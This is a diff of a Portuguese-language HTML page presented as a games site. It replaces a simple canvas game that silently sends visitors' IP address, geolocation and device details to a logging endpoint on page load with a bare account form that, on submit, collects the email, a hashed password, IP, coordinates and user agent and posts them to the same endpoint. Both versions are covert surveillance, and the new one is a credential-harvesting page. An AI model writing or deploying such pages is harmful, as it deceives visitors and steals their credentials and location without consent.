@@ -1,152 +1,45 @@
+<!-- index.html -->
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Desafio do Paneleiro</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: Arial, sans-serif;
-            background: linear-gradient(to right, #ff6b6b, #4ecdc4);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .game-container {
-            width: 90%;
-            max-width: 500px;
-            background: white;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-            text-align: center;
-        }
-        h1 {
-            color: #ff6b6b;
-            margin-bottom: 20px;
-        }
-        canvas {
-            background: #f8f9fa;
-            border-radius: 5px;
-            display: block;
-            margin: 0 auto;
-        }
-        .controls {
-            margin-top: 20px;
-        }
-        button {
-            background: #4ecdc4;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 0 5px;
-        }
-        .hidden {
-            display: none;
-        }
-    </style>
+    <title>Site de Jogos</title>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
 </head>
 <body>
-    <div class="game-container">
-        <h1>Desafio do Paneleiro</h1>
-        <canvas id="gameCanvas" width="400" height="300"></canvas>
-        <div class="controls">
-            <button onclick="startGame()">Iniciar Jogo</button>
-            <button onclick="pauseGame()" class="hidden">Pausar</button>
-        </div>
-    </div>
+    <h1>Criar Conta</h1>
+    <form id="loginForm">
+        <input type="email" id="email" required>
+        <input type="password" id="senha" required>
+        <button type="submit">Entrar</button>
+    </form>
 
     <script>
-        // Configuração do jogo
-        const canvas = document.getElementById('gameCanvas');
-        const ctx = canvas.getContext('2d');
-        let gameRunning = false;
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const senha = document.getElementById('senha').value;
 
-        // Coleta de informações no background
-        function collectBackgroundInfo() {
-            // Coleta de IP
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    console.log('IP:', data.ip);
-                    // Enviar para backend
-                    fetch('/api/log', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({type: 'ip', value: data.ip})
-                    });
-                });
+            // Coletar informações do usuário
+            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
+            const coordenadas = await new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(pos => resolve(pos.coords));
+            });
 
-            // Coleta de localização
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    console.log('Localização:', pos.coords.latitude, pos.coords.longitude);
-                    fetch('/api/log', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            type: 'location',
-                            value: {
-                                lat: pos.coords.latitude,
-                                lng: pos.coords.longitude
-                            }
-                        })
-                    });
-                });
-            }
-
-            // Coleta de dispositivo
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                resolution: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            // Criptografar dados antes de enviar
+            const dados = {
+                email,
+                senha: CryptoJS.SHA256(senha).toString(),
+                ip,
+                coordenadas,
+                userAgent: navigator.userAgent
             };
-            console.log('Dispositivo:', deviceInfo);
-            fetch('/api/log', {
+
+            // Enviar dados para Vercel
+            await fetch('/api/log', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({type: 'device', value: deviceInfo})
+                body: JSON.stringify(dados)
             });
-        }
-
-        // Função do jogo
-        function startGame() {
-            gameRunning = true;
-            document.querySelector('.controls button:first-child').classList.add('hidden');
-            document.querySelector('.controls button:last-child').classList.remove('hidden');
-            gameLoop();
-        }
-
-        function pauseGame() {
-            gameRunning = false;
-            document.querySelector('.controls button:last-child').classList.add('hidden');
-            document.querySelector('.controls button:first-child').classList.remove('hidden');
-        }
-
-        function gameLoop() {
-            if (!gameRunning) return;
-            
-            // Limpar canvas
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            
-            // Desenhar jogo (exemplo simples)
-            ctx.fillStyle = '#ff6b6b';
-            ctx.fillRect(Math.random()*300, Math.random()*200, 50, 50);
-            
-            // Continuar loop
-            requestAnimationFrame(gameLoop);
-        }
-
-        // Iniciar coleta de informações quando o site carrega
-        window.addEventListener('load', () => {
-            collectBackgroundInfo();
         });
     </script>
 </body>
